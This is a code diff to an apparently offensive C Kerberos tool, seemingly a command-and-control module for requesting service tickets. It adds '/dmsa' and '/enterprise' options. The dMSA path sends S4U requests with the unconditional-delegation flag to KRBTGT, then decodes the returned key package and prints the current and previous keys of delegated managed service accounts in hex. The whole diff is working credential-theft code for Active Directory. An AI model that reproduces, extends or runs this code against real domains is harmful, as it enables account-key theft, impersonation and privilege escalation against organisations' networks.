@@ -261,13 +261,17 @@ byte* ADRestrictionEntry_buildTokenStruct(uint flags, uint tokenIL) {
 
 
 
-BOOL New_PA_DATA_s4uX509user(EncryptionKey key, char* name, char* realm, uint nonce, int eType, PA_DATA* pa_data) {
+BOOL New_PA_DATA_s4uX509user(EncryptionKey key, char* name, char* realm, uint nonce, int eType, BOOL dmsa, PA_DATA* pa_data) {
 
     PA_S4U_X509_USER* pa = MemAlloc(sizeof(PA_S4U_X509_USER));
     pa->user_id.nonce = nonce;
+    // SIGN_REPLY = 0x20000000, UNCONDITIONAL_DELEGATION = 0x08000000
     pa->user_id.options = 0x20000000;
+    if (dmsa)
+        pa->user_id.options |= 0x08000000;
     if (my_copybuf(&(pa->user_id.crealm), realm, my_strlen(realm) + 1)) return TRUE;
-    pa->user_id.cname.name_type = PRINCIPAL_NT_ENTERPRISE;
+    // DMSA Requests do not work with NT_ENTERPRISE, force NT_PRINCIPAL
+    pa->user_id.cname.name_type = dmsa ? PRINCIPAL_NT_PRINCIPAL : PRINCIPAL_NT_ENTERPRISE;
     pa->user_id.cname.name_count = 1;
     pa->user_id.cname.name_string = MemAlloc(sizeof(void*) * pa->user_id.cname.name_count);
     if (my_copybuf(&(pa->user_id.cname.name_string[0]), name, my_strlen(name) + 1)) return TRUE;
@@ -446,7 +450,7 @@ BOOL NewTGS_REP(AsnElt asn_TGS_REP, TGS_REP* tgs_rep) {
     return FALSE;
 }
 
-BOOL NewTGS_REQ(char* userName, char* domain, char* sname, Ticket providedTicket, EncryptionKey clientKey, int requestEType, byte* tgs, BOOL opsec, BOOL u2u, BOOL unconstrained, char* targetDomain, char* s4uUser, BOOL keyList, BOOL renew, byte** reqBytes, int* reqBytesSize) {
+BOOL NewTGS_REQ(char* userName, char* domain, char* sname, Ticket providedTicket, EncryptionKey clientKey, int requestEType, byte* tgs, BOOL opsec, BOOL u2u, BOOL unconstrained, char* targetDomain, char* s4uUser, BOOL keyList, BOOL renew, BOOL dmsa, BOOL enterprise, byte** reqBytes, int* reqBytesSize) {
     AS_REQ req = { 0 };
 
     req.pvno = 5;
@@ -467,11 +471,35 @@ BOOL NewTGS_REQ(char* userName, char* domain, char* sname, Ticket providedTicket
         if (my_copybuf(&(req.req_body.cname.name_string[0]), userName, my_strlen(userName) + 1)) return TRUE;
     }
 
-    if (targetDomain == NULL)
-        if (my_copybuf(&targetDomain, domain, my_strlen(domain) + 1)) return TRUE;
-
     int partsCount = 0;
     char** parts = my_strsplit( sname, '/', &partsCount );
+
+    // Cross-domain logic: extract targetDomain from SPN if not specified
+    if (targetDomain == NULL) {
+        if (enterprise) {
+            // For enterprise principal, extract domain from user@domain format
+            int atIndex = my_strfind(sname, '@');
+            if (atIndex > 0) {
+                if (my_copybuf(&targetDomain, sname + atIndex + 1, my_strlen(sname) - atIndex)) return TRUE;
+            } else {
+                if (my_copybuf(&targetDomain, domain, my_strlen(domain) + 1)) return TRUE;
+            }
+        }
+        else if ((partsCount > 1) && my_strcmp(parts[0], "krbtgt") && (tgs == NULL) && my_strcmp(parts[0], "kadmin")) {
+            // Extract domain from SPN like cifs/server.sub.domain.com -> sub.domain.com
+            int dotIndex = my_strfind(parts[1], '.');
+            if (dotIndex > 0 && my_strfind(parts[1] + dotIndex + 1, '.') > 0) {
+                // Has at least 2 dots, extract from first dot
+                if (my_copybuf(&targetDomain, parts[1] + dotIndex + 1, my_strlen(parts[1]) - dotIndex)) return TRUE;
+                // Remove port if present (e.g., domain.com:1234)
+                int colonIndex = my_strfind(targetDomain, ':');
+                if (colonIndex > 0)
+                    targetDomain[colonIndex] = 0;
+            }
+        }
+        if (targetDomain == NULL)
+            if (my_copybuf(&targetDomain, domain, my_strlen(domain) + 1)) return TRUE;
+    }
 
     if (my_copybuf(&req.req_body.realm, targetDomain, my_strlen(targetDomain) + 1)) return TRUE;
     StrToUpper(req.req_body.realm);
@@ -524,6 +552,14 @@ BOOL NewTGS_REQ(char* userName, char* domain, char* sname, Ticket providedTicket
             req.req_body.sname.name_string = MemAlloc(req.req_body.sname.name_count * sizeof(void*));
             my_copybuf(&(req.req_body.sname.name_string[0]), sname, my_strlen(sname) + 1);
         }
+        else if (dmsa) {
+            // DMSA: sname format is KRBTGT/DomainFQDN with NT_SRV_INST type
+            req.req_body.sname.name_type = PRINCIPAL_NT_SRV_INST;
+            req.req_body.sname.name_count = partsCount;
+            req.req_body.sname.name_string = MemAlloc(req.req_body.sname.name_count * sizeof(void*));
+            for (int i = 0; i < partsCount; i++)
+                my_copybuf(&(req.req_body.sname.name_string[i]), parts[i], my_strlen(parts[i]) + 1);
+        }
         else {
             req.req_body.sname.name_type = PRINCIPAL_NT_PRINCIPAL;
             req.req_body.sname.name_count = 1;
@@ -544,7 +580,15 @@ BOOL NewTGS_REQ(char* userName, char* domain, char* sname, Ticket providedTicket
         my_copybuf(&(req.req_body.sname.name_string[0]), sname, my_strlen(sname) + 1);
     }
     else {
-        if (partsCount == 1) {
+        if (enterprise) {
+            // NT_ENTERPRISE principal (user@domain or UPN format)
+            req.req_body.sname.name_type = PRINCIPAL_NT_ENTERPRISE;
+            req.req_body.sname.name_count = 1;
+            req.req_body.sname.name_string = MemAlloc(req.req_body.sname.name_count * sizeof(void*));
+            my_copybuf(&(req.req_body.sname.name_string[0]), sname, my_strlen(sname) + 1);
+            req.req_body.kdc_options = req.req_body.kdc_options | CANONICALIZE;
+        }
+        else if (partsCount == 1) {
             // service and other unique instance (e.g. krbtgt)
             req.req_body.sname.name_type = PRINCIPAL_NT_SRV_INST;
             req.req_body.sname.name_count = 2;
@@ -601,7 +645,7 @@ BOOL NewTGS_REQ(char* userName, char* domain, char* sname, Ticket providedTicket
     byte* cksum_Bytes = NULL;
     int cksum_Bytes_length = 0;
 
-    if (opsec) {
+    if (opsec || (dmsa && s4uUser)) {
         req.req_body.kdc_options = req.req_body.kdc_options | CANONICALIZE;
         if (unconstrained)
             req.req_body.kdc_options = req.req_body.kdc_options | FORWARDED;
@@ -696,7 +740,7 @@ BOOL NewTGS_REQ(char* userName, char* domain, char* sname, Ticket providedTicket
     PA_DATA padata = { 0 };
     if (New_PA_DATA(domain, userName, providedTicket, clientKey, opsec, cksum_Bytes, cksum_Bytes_length, &padata)) return TRUE;
 
-    req.pa_data_count = 1 + (opsec && s4uUser) + (s4uUser || opsec || (tgs && !u2u)) + keyList;
+    req.pa_data_count = 1 + ((opsec || dmsa) && s4uUser) + ((s4uUser && !dmsa) || opsec || (tgs && !u2u)) + keyList;
     int padata_index = 0;
     req.pa_data = MemAlloc(req.pa_data_count * sizeof(PA_DATA));
     req.pa_data[padata_index++] = padata;
@@ -708,16 +752,16 @@ BOOL NewTGS_REQ(char* userName, char* domain, char* sname, Ticket providedTicket
         req.pa_data[padata_index++] = keyListPaData;
     }
 
-    if (opsec && s4uUser) {
+    if ((opsec || dmsa) && s4uUser) {
         // real packets seem to lowercase the domain in these 2 PA_DATA's
         StrToLower(domain);
         PA_DATA s4upadata = { 0 };
-        if (New_PA_DATA_s4uX509user(clientKey, s4uUser, domain, req.req_body.nonce, clientKey.key_type, &s4upadata)) return TRUE;
+        if (New_PA_DATA_s4uX509user(clientKey, s4uUser, domain, req.req_body.nonce, clientKey.key_type, dmsa, &s4upadata)) return TRUE;
         req.pa_data[padata_index++] = s4upadata;
     }
 
-    // add final S4U PA-DATA
-    if (s4uUser) {
+    // add final S4U PA-DATA when not a DMSA request (DMSA only uses PA_S4U_X509_USER)
+    if (s4uUser && !dmsa) {
         // constrained delegation yo'
         PA_DATA s4upadata = { 0 };
         if (New_PA_DATA_s4u2self(clientKey, s4uUser, domain, &s4upadata)) return TRUE;
@@ -744,12 +788,14 @@ BOOL NewTGS_REQ(char* userName, char* domain, char* sname, Ticket providedTicket
     return FALSE;
 }
 
-BOOL TGS(char* userName, char* domain, Ticket providedTicket, EncryptionKey clientKey, char* service, int requestEType, char* domainController, byte* tgs, BOOL opsec, BOOL ptt, BOOL u2u, char* targetDomain, char* targetUser, BOOL display, BOOL keyList, byte** retTgsBytes, int* retTgsBytesLength /*BOOL roast = FALSE, string asrepkey = "" */) {
+BOOL TGS(char* userName, char* domain, Ticket providedTicket, EncryptionKey clientKey, char* service, int requestEType, char* domainController, byte* tgs, BOOL opsec, BOOL ptt, BOOL u2u, char* targetDomain, char* targetUser, BOOL display, BOOL keyList, BOOL dmsa, BOOL enterprise, byte** retTgsBytes, int* retTgsBytesLength /*BOOL roast = FALSE, string asrepkey = "" */) {
 
     if (keyList)
         PRINT_OUT("\n[*] Building KeyList TGS-REQ request for: '%s'\n", userName);
+    else if (dmsa)
+        PRINT_OUT("\n[*] Building DMSA TGS-REQ request for '%s' from '%s'\n", targetUser, userName);
     else if (service)
-        PRINT_OUT("\n[*] Building TGS - REQ request for: '%s'\n", service);
+        PRINT_OUT("\n[*] Building TGS-REQ request for: '%s'\n", service);
     else if (u2u)
         PRINT_OUT("\n[*] Building User-to-User TGS-REQ request for: '%s'\n", userName);
     else
@@ -768,7 +814,7 @@ BOOL TGS(char* userName, char* domain, Ticket providedTicket, EncryptionKey clie
 
     byte* tgsBytes = NULL;
     int	  tgsBytesLength = 0;
-    if (NewTGS_REQ(userName, domain, service, providedTicket, clientKey, requestEType, tgs, opsec, u2u, FALSE, targetDomain, targetUser, keyList, FALSE, &tgsBytes, &tgsBytesLength)) return TRUE;
+    if (NewTGS_REQ(userName, domain, service, providedTicket, clientKey, requestEType, tgs, opsec, u2u, FALSE, targetDomain, targetUser, keyList, FALSE, dmsa, enterprise, &tgsBytes, &tgsBytesLength)) return TRUE;
 
     byte* response = NULL;
     int   responseSize = 0;
@@ -813,7 +859,7 @@ BOOL TGS(char* userName, char* domain, Ticket providedTicket, EncryptionKey clie
 
             byte* tgtBytes = NULL;
             int	  tgtBytesLength = 0;
-            if (NewTGS_REQ(userName, domain, krbtgt_service, providedTicket, clientKey, requestEType, tgs, opsec, FALSE, TRUE, NULL, NULL, keyList, FALSE, /*, roast*/ &tgtBytes, &tgtBytesLength)) return TRUE;
+            if (NewTGS_REQ(userName, domain, krbtgt_service, providedTicket, clientKey, requestEType, tgs, opsec, FALSE, TRUE, NULL, NULL, keyList, FALSE, FALSE, FALSE, &tgtBytes, &tgtBytesLength)) return TRUE;
 
             byte* tgt_response = NULL;
             int   tgt_responseSize = 0;
@@ -891,6 +937,54 @@ BOOL TGS(char* userName, char* domain, Ticket providedTicket, EncryptionKey clie
                 }
                 PRINT_OUT("\n");
             }
+            
+            if (dmsa && encRepPart.encryptedPaData.keytype == 171) {
+
+                DmsaKeyPackage* pkg = &(encRepPart.encryptedPaData.dmsaKeyPackage);
+                if (pkg->currentKeysCount > 0 && pkg->currentKeys) {
+                    PRINT_OUT("  [*] Current keys:\n");
+                    for (int k = 0; k < pkg->currentKeysCount; k++) {
+                        EncryptionKey* key = &(pkg->currentKeys[k]);
+                        if (key->key_value && key->key_size > 0) {
+                            int hexLen = key->key_size * 2 + 1;
+                            char* hexKey = MemAlloc(hexLen);
+                            if (hexKey) {
+                                my_tohex(key->key_value, key->key_size, &hexKey, hexLen);
+
+                                char* etypeName = "unknown";
+                                if (key->key_type == 18) etypeName = "aes256_cts_hmac_sha1_96";
+                                else if (key->key_type == 17) etypeName = "aes128_cts_hmac_sha1_96";
+                                else if (key->key_type == 23) etypeName = "rc4_hmac               ";
+                                else if (key->key_type == 3) etypeName = "des_cbc_md5            ";
+
+                                PRINT_OUT("      %s : %s\n", etypeName, hexKey);
+                            }
+                        }
+                    }
+                }
+
+                if (pkg->previousKeysCount > 0 && pkg->previousKeys) {
+                    PRINT_OUT("  [*] Previous keys:\n");
+                    for (int k = 0; k < pkg->previousKeysCount; k++) {
+                        EncryptionKey* key = &(pkg->previousKeys[k]);
+                        if (key->key_value && key->key_size > 0) {
+                            int hexLen = key->key_size * 2 + 1;
+                            char* hexKey = MemAlloc(hexLen);
+                            if (hexKey) {
+                                my_tohex(key->key_value, key->key_size, &hexKey, hexLen);
+
+                                char* etypeName = "unknown";
+                                if (key->key_type == 18) etypeName = "aes256_cts_hmac_sha1_96";
+                                else if (key->key_type == 17) etypeName = "aes128_cts_hmac_sha1_96";
+                                else if (key->key_type == 23) etypeName = "rc4_hmac               ";
+                                else if (key->key_type == 3) etypeName = "des_cbc_md5            ";
+
+                                PRINT_OUT("      %s : %s\n", etypeName, hexKey);
+                            }
+                        }
+                    }
+                }
+            }
         }
         if (ptt)
             PTT(NULL, ticket);
@@ -912,7 +1006,7 @@ BOOL TGS(char* userName, char* domain, Ticket providedTicket, EncryptionKey clie
     return TRUE;
 }
 
-BOOL AskTGS(KRB_CRED kirbi, char* service, int requestEType, char* dc, byte* tgs, BOOL opsec, BOOL ptt, BOOL u2u, char* targetDomain, char* targetUser, BOOL display, BOOL keyList /*, BOOL roast = FALSE, string servicekey = "", string asrepkey = "" */) {
+BOOL AskTGS(KRB_CRED kirbi, char* service, int requestEType, char* dc, byte* tgs, BOOL opsec, BOOL ptt, BOOL u2u, char* targetDomain, char* targetUser, BOOL display, BOOL keyList, BOOL dmsa, BOOL enterprise /*, BOOL roast = FALSE, string servicekey = "", string asrepkey = "" */) {
     char* userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
     char* domain = kirbi.enc_part.ticket_info[0].prealm;
     Ticket ticket = kirbi.tickets[0];
@@ -924,12 +1018,12 @@ BOOL AskTGS(KRB_CRED kirbi, char* service, int requestEType, char* dc, byte* tgs
     for (int i = 0; i < svcCount; i++) {
         byte* tgsBytes = NULL;
         int tgsBytesLength = 0;
-        TGS(userName, domain, ticket, clientKey, services[i], requestEType, dc, tgs, opsec, ptt, FALSE, targetDomain, targetUser, display, keyList, &tgsBytes, &tgsBytesLength /* roast, asrepkey */);
+        TGS(userName, domain, ticket, clientKey, services[i], requestEType, dc, tgs, opsec, ptt, FALSE, targetDomain, targetUser, display, keyList, dmsa, enterprise, &tgsBytes, &tgsBytesLength /* roast, asrepkey */);
     }
     return FALSE;
 }
 
-void AskTGSExecute(byte* ticket, char* service, int requestEType, char* dc, byte* tgs, bool opsec, bool u2u, bool ptt, bool keyList, char* targetDomain, char* targetUser ) {
+void AskTGSExecute(byte* ticket, char* service, int requestEType, char* dc, byte* tgs, bool opsec, bool u2u, bool ptt, bool keyList, bool dmsa, bool enterprise, char* targetDomain, char* targetUser ) {
     int bytesSize = 0;
     byte* bytes = base64_decode(ticket, &bytesSize);
 
@@ -939,7 +1033,7 @@ void AskTGSExecute(byte* ticket, char* service, int requestEType, char* dc, byte
 
     AsnGetKrbCred(&(asn_KRB_CRED.sub[0]), &kirbi);
 
-    AskTGS( kirbi, service, requestEType, dc, tgs, opsec, ptt, u2u, targetDomain, targetUser, TRUE, keyList );
+    AskTGS( kirbi, service, requestEType, dc, tgs, opsec, ptt, u2u, targetDomain, targetUser, TRUE, keyList, dmsa, enterprise );
 }
 
 void ASK_TGS_RUN( PCHAR Buffer, DWORD Length ) {
@@ -958,6 +1052,8 @@ void ASK_TGS_RUN( PCHAR Buffer, DWORD Length ) {
     bool  opsec        = FALSE;
     bool  keyList      = FALSE;
     bool  u2u          = FALSE;
+    bool  dmsa         = FALSE;
+    bool  enterprise   = FALSE;
 
     for (int i = 0; i < Length; i++) {
         i += GetStrParam(Buffer + i, Length - i, "/service:", 9, &service );
@@ -970,8 +1066,10 @@ void ASK_TGS_RUN( PCHAR Buffer, DWORD Length ) {
         i += GetStrParam(Buffer + i, Length - i, "/enctype:", 9, &s_enctype );
         i += IsSetParam(Buffer + i, Length - i, "/ptt", 4, &ptt );
         i += IsSetParam(Buffer + i, Length - i, "/opsec", 6, &opsec );
-        i += IsSetParam(Buffer + i, Length - i, "/keylist", 7, &keyList );
+        i += IsSetParam(Buffer + i, Length - i, "/keylist", 8, &keyList );
         i += IsSetParam(Buffer + i, Length - i, "/u2u", 4, &u2u );
+        i += IsSetParam(Buffer + i, Length - i, "/dmsa", 5, &dmsa );
+        i += IsSetParam(Buffer + i, Length - i, "/enterprise", 11, &enterprise );
     }
 
     if( s_enctype ) {
@@ -993,7 +1091,7 @@ void ASK_TGS_RUN( PCHAR Buffer, DWORD Length ) {
     }
 
     if ( ticket )
-        AskTGSExecute(ticket, service, encType, dc, tgs, opsec, u2u, ptt, keyList, targetDomain, targetUser);
+        AskTGSExecute(ticket, service, encType, dc, tgs, opsec, u2u, ptt, keyList, dmsa, enterprise, targetDomain, targetUser);
     else
         PRINT_OUT("\n[X] A /ticket:X needs to be supplied!\n");
 }
